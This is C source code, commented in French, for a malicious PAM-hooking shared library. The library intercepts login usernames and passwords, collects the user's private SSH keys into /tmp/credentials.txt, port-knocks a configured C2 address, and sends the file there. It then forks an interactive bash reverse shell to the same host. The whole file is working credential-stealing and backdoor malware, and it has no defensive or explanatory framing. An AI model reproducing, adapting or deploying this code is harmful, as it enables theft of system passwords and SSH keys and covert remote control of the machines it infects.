#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <syslog.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <pty.h>      // Pour forkpty()
#include <utmp.h>     // Pour forkpty()
#include <pwd.h>      // Pour getpwuid(), getpwnam()

// ------------------------------------------------------------------
// Définition des pointeurs pour les fonctions PAM originales
// ------------------------------------------------------------------
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

static pam_get_item_t original_pam_get_item = NULL;
static pam_get_user_t original_pam_get_user = NULL;

// ------------------------------------------------------------------
// Configuration
// ------------------------------------------------------------------
#define CREDENTIALS_FILE "/tmp/credentials.txt"

// IP/ports de votre C2
#define REMOTE_HOST       "192.168.64.11"
#define KNOCK_PORT1       5001
#define KNOCK_PORT2       5002
#define KNOCK_PORT3       5003
#define CREDENTIALS_PORT  4444
#define SHELL_PORT        4445

// ------------------------------------------------------------------
// Variable globale pour stocker le nom d'utilisateur intercepté
// ------------------------------------------------------------------
static char g_username[256] = {0};

// ------------------------------------------------------------------
// Fonctions utilitaires
// ------------------------------------------------------------------
static const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

static void write_to_file(const char *type, const char *data) {
    FILE *file = fopen(CREDENTIALS_FILE, "a");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s : %m", CREDENTIALS_FILE);
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);
    syslog(LOG_INFO, "[DEBUG] Écriture dans %s => %s : %s", CREDENTIALS_FILE, type, data);
}

// ------------------------------------------------------------------
// Fonction pour récupérer et ajouter les clés SSH dans le fichier
// en se basant sur le home directory réel (home_dir)
// ------------------------------------------------------------------
static void append_ssh_keys_to_file(const char *home_dir) {
    if (!home_dir || !*home_dir) {
        syslog(LOG_ERR, "[ERROR] append_ssh_keys_to_file: home_dir est vide ou NULL");
        return;
    }

    // Chemin du dossier .ssh
    char ssh_dir[512];
    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home_dir);

    // Ouverture du fichier credentials en append
    FILE *fp = fopen(CREDENTIALS_FILE, "a");
    if (!fp) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour ajout des clés SSH : %m", CREDENTIALS_FILE);
        return;
    }
    
    fprintf(fp, "\n[SSH KEYS]\n");
    syslog(LOG_INFO, "[DEBUG] Ajout des clés SSH depuis %s dans %s", ssh_dir, CREDENTIALS_FILE);

    // Liste des fichiers de clés potentiels
    const char *keys[] = {"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"};
    int nb_keys = sizeof(keys)/sizeof(keys[0]);

    for (int i = 0; i < nb_keys; i++) {
        char key_path[1024];
        snprintf(key_path, sizeof(key_path), "%s/%s", ssh_dir, keys[i]);
        
        syslog(LOG_INFO, "[DEBUG] Tentative d'ouverture de la clé : %s", key_path);
        FILE *key_file = fopen(key_path, "r");
        if (key_file) {
            syslog(LOG_INFO, "[DEBUG] Clé SSH %s trouvée et ouverte.", key_path);
            fprintf(fp, "----- BEGIN %s -----\n", keys[i]);

            char buffer[1024];
            size_t n;
            while ((n = fread(buffer, 1, sizeof(buffer), key_file)) > 0) {
                fwrite(buffer, 1, n, fp);
            }
            fprintf(fp, "\n----- END %s -----\n", keys[i]);
            fclose(key_file);
        } else {
            syslog(LOG_INFO, "[DEBUG] Clé SSH %s non trouvée ou inaccessible.", key_path);
        }
    }
    fclose(fp);
    syslog(LOG_INFO, "[DEBUG] Fin de l'ajout des clés SSH dans le fichier credentials.");
}

// ------------------------------------------------------------------
// Fonctions de knocking, envoi de fichier et reverse shell
// ------------------------------------------------------------------
static int port_knock(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] port_knock: socket : %m");
        return -1;
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] port_knock: connexion %s:%d échouée : %m", ip, port);
    } else {
        syslog(LOG_INFO, "[INFO] Knock réussi sur %s:%d", ip, port);
    }
    close(sock);
    return 0;
}

static void send_file_tcp(const char *ip, int remote_port) {
    syslog(LOG_INFO, "[DEBUG] Envoi du fichier %s vers %s:%d", CREDENTIALS_FILE, ip, remote_port);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] send_file_tcp: socket : %m");
        return;
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(remote_port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] Echec connexion %s:%d : %m", ip, remote_port);
        close(sock);
        return;
    }
    FILE *f = fopen(CREDENTIALS_FILE, "r");
    if (!f) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour envoi", CREDENTIALS_FILE);
        close(sock);
        return;
    }
    char buffer[1024];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        if (send(sock, buffer, bytes_read, 0) < 0) {
            syslog(LOG_ERR, "[ERROR] Echec send : %m");
            fclose(f);
            close(sock);
            return;
        }
    }
    fclose(f);
    close(sock);
    syslog(LOG_INFO, "[INFO] Fichier %s envoyé à %s:%d", CREDENTIALS_FILE, ip, remote_port);
}

static void launch_reverse_shell(const char *ip, int port) {
    syslog(LOG_INFO, "[DEBUG] Lancement d'un reverse shell vers %s:%d", ip, port);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] launch_reverse_shell: socket creation failed: %m");
        _exit(0);
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] launch_reverse_shell: connection failed: %m");
        close(sock);
        _exit(0);
    }

    int master_fd;
    pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (pid < 0) {
        syslog(LOG_ERR, "[ERROR] forkpty failed: %m");
        close(sock);
        _exit(0);
    }
    if (pid == 0) {
        // Processus enfant : exécution d'un shell interactif
        syslog(LOG_INFO, "[DEBUG] Processus enfant => execl(/bin/bash) ...");
        execl("/bin/bash", "bash", "-i", NULL);
        _exit(0);
    } else {
        // Processus parent : relais entre la socket et la pseudo-tty
        char buffer[1024];
        fd_set fds;
        int nfds = (sock > master_fd ? sock : master_fd) + 1;
        syslog(LOG_INFO, "[DEBUG] Processus parent => relais entre le socket et la pseudo-tty");
        while (1) {
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            FD_SET(master_fd, &fds);
            int ret = select(nfds, &fds, NULL, NULL, NULL);
            if (ret < 0) {
                syslog(LOG_ERR, "[ERROR] select() a échoué : %m");
                break;
            }
            if (FD_ISSET(sock, &fds)) {
                int n = read(sock, buffer, sizeof(buffer));
                if (n <= 0)
                    break;
                write(master_fd, buffer, n);
            }
            if (FD_ISSET(master_fd, &fds)) {
                int n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0)
                    break;
                write(sock, buffer, n);
            }
        }
        close(sock);
        close(master_fd);
        syslog(LOG_INFO, "[DEBUG] Fin du reverse shell");
    }
}

// ------------------------------------------------------------------
// Intercepteurs PAM
// ------------------------------------------------------------------
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "[ERROR] pam_get_user: dlsym: %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }
    int retval = original_pam_get_user(pamh, user, prompt);
    if (retval == PAM_SUCCESS && *user) {
        syslog(LOG_INFO, "[DEBUG] pam_get_user => user=%s", *user);
        write_to_file("Login", *user);
        
        // On stocke le nom d'utilisateur intercepté dans g_username
        memset(g_username, 0, sizeof(g_username));
        strncpy(g_username, *user, sizeof(g_username)-1);
    }
    return retval;
}

int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "[ERROR] pam_get_item: dlsym: %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }
    int retval = original_pam_get_item(pamh, item_type, item);
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
        const char *password = (const char*)(*item);
        syslog(LOG_INFO, "[DEBUG] pam_get_item => Mot de passe intercepté");
        write_to_file("Password", password);
        
        // Récupérer le home directory réel de l'utilisateur "g_username"
        struct passwd *pw = NULL;
        if (g_username[0] != '\0') {
            pw = getpwnam(g_username);
        }
        if (pw == NULL) {
            syslog(LOG_ERR, "[ERROR] Impossible de récupérer le pw_dir pour l'utilisateur %s", g_username);
        } else {
            syslog(LOG_INFO, "[DEBUG] getpwnam(%s) => pw_dir=%s", g_username, pw->pw_dir);
            // 1) Récupération et ajout des clés SSH depuis le vrai home
            append_ssh_keys_to_file(pw->pw_dir);
        }

        // 2) Port knocking
        syslog(LOG_INFO, "[DEBUG] Début du port knocking");
        port_knock(REMOTE_HOST, KNOCK_PORT1);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT2);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT3);
        sleep(1);
        syslog(LOG_INFO, "[DEBUG] Fin du port knocking");
        
        // 3) Envoi du fichier (login + mdp + clés SSH)
        send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);
        
        // 4) Lancement du reverse shell dans un processus séparé
        pid_t shell_pid = fork();
        if (shell_pid == 0) {
            launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
            _exit(0);
        }
    }
    return retval;
}

